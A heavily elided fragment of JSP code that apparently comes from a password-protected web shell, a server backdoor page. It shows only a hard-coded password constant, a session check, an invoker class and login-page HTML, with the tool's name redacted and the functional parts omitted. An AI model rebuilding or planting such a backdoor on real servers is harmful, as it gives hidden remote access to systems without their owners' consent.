...
<%!private static final String PW = "wwwgooglecom"; //password
	private static final String PW_SESSION_ATTRIBUTE = "xxxPwd";
	...
	private static final String MODIFIED_ERROR = "xxxxxx Was Modified By Some Other Applications. Please Logout.";
	...
	private static class BeforeInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
			...
			try {
				PrintWriter out = response.getWriter();
				out
						.println("<html><head><title>xxxxxx</title><style type=\"text/css\">"
			...
			try {
				...
				out
						.println("<form action=\""
								...
								+ "	<tr class=\"head\">"
								+ "		<td><span style=\"float:right;\">xxxxxx</span>"
